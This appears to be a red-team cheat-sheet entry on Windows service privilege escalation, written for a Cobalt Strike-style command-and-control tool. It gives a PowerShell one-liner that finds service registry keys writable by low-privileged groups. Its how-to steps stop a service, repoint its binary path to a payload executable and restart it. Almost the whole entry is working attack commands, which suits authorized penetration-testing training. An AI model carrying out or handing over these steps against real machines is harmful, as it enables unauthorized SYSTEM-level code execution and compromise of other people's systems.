Use PowerShell to search for services where low-priv users have FullControl rights.
```
powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```

#### How to steps

Set the spawnto for the service binary payload.
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Stop the process
```
sc_stop BadWindowsService
```

Get the service Current binary path
```
sc_qc BadWindowsService
```

Change the binary path to point to our payload
```
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```

Start the service
```
‌sc_start BadWindowsService
```

